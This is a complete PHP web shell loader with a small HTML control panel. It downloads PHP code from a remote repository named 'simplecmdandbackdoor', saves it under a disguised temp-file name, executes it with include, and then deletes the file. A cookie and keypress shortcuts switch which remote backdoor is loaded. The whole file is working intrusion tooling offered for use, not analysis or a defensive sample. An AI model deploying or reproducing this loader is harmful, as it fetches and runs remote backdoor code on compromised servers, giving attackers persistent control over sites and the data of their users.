<?php

function get_remote_content($remote_location) {
    if (function_exists('curl_exec')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $remote_location);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        $response = curl_exec($ch);
        curl_close($ch);
        if ($response !== false) {
            return $response;
        }
    }

    if (function_exists('file_get_contents')) {
        $response = @file_get_contents($remote_location);
        if ($response !== false) {
            return $response;
        }
    }

    if (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = @fopen($remote_location, "r");
        if ($handle) {
            $response = @stream_get_contents($handle);
            fclose($handle);
            if ($response !== false) {
                return $response;
            }
        }
    }

    return false;
}

$default_cache = "https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/main/ws.php";
$backnadya = isset($_GET['backnadya']);

if (!$backnadya) {
    if (!isset($_COOKIE['current_cache']) || empty($_COOKIE['current_cache'])) {
        setcookie('current_cache', urlencode($default_cache), time() + 3600, "/");
        $_COOKIE['current_cache'] = $default_cache;
    }

    $remote_location = urldecode($_COOKIE['current_cache']);

    $remote_location = filter_var($remote_location, FILTER_VALIDATE_URL);
    if ($remote_location === false) {
        die("Invalid URL.");
    }

    $parsed_url = parse_url($remote_location);
    if (!isset($parsed_url['scheme']) || !in_array($parsed_url['scheme'], ['https'])) {
        die("Only HTTPS protocol is allowed.");
    }

    $tmpfname = tempnam(sys_get_temp_dir(), '.trash.' . md5($remote_location . time()));
    if ($tmpfname === false) {
        die("Failed to create temporary file.");
    }

    $remote_content = get_remote_content($remote_location);
    if ($remote_content === false) {
        die("Failed to retrieve remote content.");
    }

    $handle = fopen($tmpfname, "w+");
    if ($handle === false) {
        unlink($tmpfname);
        die("Failed to open temporary file.");
    }
    fwrite($handle, $remote_content);
    fclose($handle);

    if (strpos(file_get_contents($tmpfname), '<?php') === false) {
        unlink($tmpfname);
        die("Invalid file content.");
    }

    include $tmpfname;
    unlink($tmpfname);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Backnadya Cookie Setter</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 1em;
      background-color: #f4f4f4;
      color: #333;
    }
    h1 {
      color: #E427A8;
    }
    p {
      margin: 0.5em 0;
      font-size: 1rem;
    }
    .info {
      color: #006600;
    }
    .warning {
      color: #990000;
    }
    a {
      color: #0066cc;
    }
    a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
<h1>Backnadya Cookie Setter</h1>

  <p class="info">
    Press <strong>1</strong>, <strong>2</strong>, <strong>3</strong> to set the <code>current_cache</code> cookie with a different URL. </p>
  <p class="info">You can also use 0 reset to the <strong>default</strong> URL.
  </p>

  <p>
    Currently, the cookie value is: <code><?php echo isset($_COOKIE['current_cache']) ? $_COOKIE['current_cache'] : 'empty'; ?></code>
  </p>

  <p>To run the remote file (based on the cookie value), visit:</p>
  <p class="info">https://yournad.ya/yournadya.php</p>

  <p>If you wish to remain in interactive mode (to change the cookie value), ensure the URL contains the parameter <code>?backnadya=1</code>.</p>
  <p>Recoded by Lemiere.</p>
  <script>
    function deleteCookie(name) {
      document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
    }

    function setCookie(name, value, days) {
      let expires = "";
      if (days) {
        let date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
      }
      document.cookie = name + "=" + value + expires + "; path=/";
    }

    document.addEventListener("keydown", function(event) {
      deleteCookie("current_cache");

      if (event.key === "1") {
        setCookie("current_cache", encodeURIComponent("https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/main/jq.php"), 1);
      } else if (event.key === "2") {
        setCookie("current_cache", encodeURIComponent("https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/main/cnt.php"), 1);
      } else if (event.key === "3") {
        setCookie("current_cache", encodeURIComponent("https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/main/wss2.php"), 1);
      } else if (event.key.toUpperCase() === "0") { 
        setCookie("current_cache", encodeURIComponent("<?php echo $default_cache; ?>"), 1);
      } else {
        return;
      }

      window.location.reload();
    });
  </script>
</body>
</html>
